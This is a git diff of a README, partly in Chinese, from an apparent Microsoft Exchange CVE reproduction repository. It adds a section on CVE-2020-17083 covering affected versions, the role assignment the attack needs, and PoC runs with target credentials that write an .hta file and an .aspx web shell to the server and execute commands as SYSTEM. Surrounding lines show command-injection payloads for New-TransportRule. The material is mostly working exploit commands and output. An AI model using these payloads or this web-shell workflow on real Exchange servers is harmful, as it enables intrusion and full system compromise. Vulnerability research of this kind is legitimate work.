@@ -21,7 +21,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
 | CVE-2020-16875 (completed) [youtube demo](https://www.youtube.com/watch?v=HZ20U4VW2wA) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
 | CVE-2020-17132 (completed) [youtube demo](https://www.youtube.com/watch?v=S9S2YChZK7k) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
-| CVE-2020-17083 | [CVE-2020-17083]() |  |  | yes |
+| CVE-2020-17083(completed) [youtube demo]() | [CVE-2020-17083](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17083) | Nov 10, 2020 | Microsoft Exchange Server Remote Code Execution Vulnerability | yes |
 | CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
 | CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
 | CVE-2021-24085 | [CVE-2021-24085](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-24085) | Feb 9, 2021 | An authenticated attacker can leak a cert file which results in a CSRF token to be generated. | yes |
@@ -447,20 +447,107 @@ neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) -DlpPolicy "%%
 & 'Invoke-Expression' '[Diagnostics.Process]::Start("cmd","/c %s")'; New-TransportRule -DlpPolicy
 ```
 
-# CVE-2020-17083
+# CVE-2020-17083 (completed)
 ## CVE-2020-17083 part links
 
  - [Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-17083.ps1.txt)
- - [CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞 POC](https://mp.weixin.qq.com/s/LMUMmuGfT3nmKN88O5hBAA)
+ - [CVE-2020-17083：Exchange Authed Rce 分析](https://mp.weixin.qq.com/s/sC9rN4NhO9a6Q-uQWNXa7Q)
+
+ - 影响exchange版本
+
+``` bash
+Microsoft Exchange Server 2013 Cumulative Update 23
+Microsoft Exchange Server 2016 Cumulative Update 17
+Microsoft Exchange Server 2016 Cumulative Update 18
+Microsoft Exchange Server 2019 Cumulative Update 6
+Microsoft Exchange Server 2019 Cumulative Update 7
+```
+
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
+| 测试成功 | Exchange Server 2013 累计更新 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |
+
+此漏洞是由于ExportExchangeCertificate WriteCertiricate文件写入功能导致的。远程攻击者可以利用这一点，通过精心构造的HTTP请求在应用程序上下文中执行任意代码。
+
+ - (ab)用户需要分配"Exchange Server Certificates"角色
+
+``` bash
+[PS] C:\Windows\system32>New-RoleGroup -Name "cert users" -Roles "Exchange Server Certificates" -Members "administrator"
+
+Name       AssignedRoles                  RoleAssignments                           ManagedBy
+----       -------------                  ---------------                           ---------
+cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchange2016.com/Microsoft Exchange Secur
+                                                                                    ity Groups/Organization Management, exchan
+                                                                                    ge2016.com/Users/Administrator}
+
+[PS] C:\Windows\system32>Get-RoleGroup "cert users" | Format-List
 
 
+RunspaceId                  : ded4f6c8-e011-42e3-b68e-5b9a3beb1e5d
+ManagedBy                   : {exchange2016.com/Microsoft Exchange Security Groups/Organization Management, exchange2016.com/U
+                              sers/Administrator}
+RoleAssignments             : {Exchange Server Certificates-cert users}
+Roles                       : {Exchange Server Certificates}
+DisplayName                 :
+ExternalDirectoryObjectId   :
+Members                     : {exchange2016.com/Users/Administrator}
+SamAccountName              : cert users
+Description                 :
+RoleGroupType               : Standard
+LinkedGroup                 :
+Capabilities                : {}
+LinkedPartnerGroupId        :
+LinkedPartnerOrganizationId :
+Identity                    : exchange2016.com/Microsoft Exchange Security Groups/cert users
+IsValid                     : True
+ExchangeVersion             : 0.10 (14.0.100.0)
+Name                        : cert users
+DistinguishedName           : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchange2016,DC=com
+Guid                        : b912e05a-5bfe-4846-90fb-9fbdf15ec412
+ObjectCategory              : exchange2016.com/Configuration/Schema/Group
+ObjectClass                 : {top, group}
+WhenChanged                 : 2023/11/16 10:14:11
+WhenCreated                 : 2023/11/16 10:14:11
+WhenChangedUTC              : 2023/11/16 2:14:11
+WhenCreatedUTC              : 2023/11/16 2:14:11
+OrganizationId              :
+Id                          : exchange2016.com/Microsoft Exchange Security Groups/cert users
+OriginatingServer           : WIN-UPF09R7H264.exchange2016.com
+ObjectState                 : Changed
+```
 
+ - ![](./pics/cve-2020-17083.png)
 
+ - 漏洞复现
 
+原powershell poc需要在域内环境中使用，直接在存在漏洞的exchange本机复现，若要实现非域环境远程RCE功能需要修改为python版本exp，并更换python powershell执行命令的端点，目前暂未找到合适的实现方法
 
+ - [cve-2020-17083.ps1](./CVE-2020-17083/cve-2020-17083.ps1)
 
+``` bash
+PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-UPF09R7H264.exchange2016.com
+-usr administrator@exchange2016.com -pwd 123456Wx.. -cmd mspaint
+(+) targeting WIN-UPF09R7H264.exchange2016.com with administrator@exchange2016.com:123456Wx..
+(+) wrote to target file C:/Windows/Temp/BIAHDTaO.hta
+(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/Mo3LwKhN
+.aspx
+(+) shell written, executing command...
+(+) executed mspaint as SYSTEM!
+```
 
+ - ![](./pics/cve-2020-17083-1.png)
 
+``` bash
+PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.exchange2013.com -usr administrator@exchange2013.com -pwd 123456Wx.. -cmd mspaint
+(+) targeting WIN-2FFDIR22V0Q.exchange2013.com with administrator@exchange2013.com:123456Wx..
+(+) wrote to target file C:/Windows/Temp/HZkLQyCX.hta
+(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/X98xek1r.aspx
+(+) shell written, executing command...
+(+) executed mspaint as SYSTEM!
+```
+
+ - ![](./pics/cve-2020-17083-2.png)
 
 # CVE-2020-17143
 ## CVE-2020-17143 part links
